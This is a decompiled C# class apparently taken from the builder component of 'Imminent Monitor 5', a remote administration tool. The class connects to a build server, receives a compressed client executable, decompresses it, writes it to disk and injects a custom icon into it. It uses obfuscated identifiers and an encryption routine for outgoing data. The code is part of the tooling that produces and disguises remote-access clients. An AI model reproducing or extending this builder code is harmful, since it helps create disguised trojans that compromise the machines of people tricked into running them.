// Decompiled with JetBrains decompiler
// Type: GClass45
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;

public sealed class GClass45
{
  public ushort ushort_0;
  private GClass10 gclass10_0;
  public object[] object_0;
  public byte[] byte_0;
  public string string_0;
  public byte[] byte_1;

  public GClass45()
  {
    this.ushort_0 = (ushort) 4154;
    this.vmethod_1(new GClass10());
    this.string_0 = (string) null;
  }

  public virtual GClass10 vmethod_0() => this.gclass10_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_1(GClass10 gclass10_1)
  {
    GClass10.GDelegate3 gdelegate3_1 = new GClass10.GDelegate3(this.method_3);
    if (this.gclass10_0 != null)
      this.gclass10_0.method_1(gdelegate3_1);
    this.gclass10_0 = gclass10_1;
    if (this.gclass10_0 == null)
      return;
    this.gclass10_0.method_0(gdelegate3_1);
  }

  public void method_0()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), "61C&$Pa.Q$", object_3);
  }

  private string method_1(string string_1)
  {
    char[] charArray = string_1.ToCharArray();
    Array.Reverse((Array) charArray);
    return new string(charArray);
  }

  private void method_2(GClass10 gclass10_1, byte[] byte_2)
  {
    byte_2 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(byte_2, this.byte_1);
    gclass10_1.method_23(byte_2);
  }

  private void method_3(GClass10 gclass10_1, bool bool_0)
  {
    if (bool_0)
    {
      Class97.formBuildLog_0.method_0("Connected to Build Server.");
    }
    else
    {
      Class97.formBuildLog_0.method_0("Disconnected from Build Server.");
      Class97.formBuildLog_0.Invoke((Delegate) (() => Class97.formBuildLog_0.method_2()));
    }
  }

  public void method_4(GClass10 gclass10_1, GClass45.GEnum8 genum8_0, object[] object_1)
  {
    switch (genum8_0)
    {
      case (GClass45.GEnum8) 0:
        this.method_5(object_1);
        break;
      case (GClass45.GEnum8) 1:
        this.method_6((string) object_1[1]);
        break;
      case (GClass45.GEnum8) 2:
        this.method_7();
        break;
    }
  }

  private void method_5(object[] object_1)
  {
    File.WriteAllBytes(this.string_0, this.method_8((byte[]) object_1[2]));
    if (Operators.CompareString(Class97.string_0, (string) null, false) != 0)
    {
      Class97.formBuildLog_0.method_0("Injecting Icon...");
      GClass28.smethod_0(this.string_0, Class97.string_0);
      Class97.formBuildLog_0.method_0("Icon Injected.");
    }
    Class97.formBuildLog_0.method_0("Client Received & Built.");
    this.vmethod_0().method_25();
  }

  private void method_6(string string_1) => Class97.formBuildLog_0.method_0(string_1);

  private void method_7() => this.method_2(this.vmethod_0(), this.byte_0);

  private byte[] method_8(byte[] byte_2)
  {
    MemoryStream memoryStream1 = new MemoryStream();
    memoryStream1.Write(byte_2, 0, byte_2.Length);
    memoryStream1.Position = 0L;
    GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress, true);
    MemoryStream memoryStream2 = new MemoryStream();
    byte[] numArray = new byte[64];
    for (int count = gzipStream.Read(numArray, 0, numArray.Length); count > 0; count = gzipStream.Read(numArray, 0, numArray.Length))
      memoryStream2.Write(numArray, 0, count);
    gzipStream.Close();
    return memoryStream2.ToArray();
  }

  public enum GEnum8
  {
  }
}
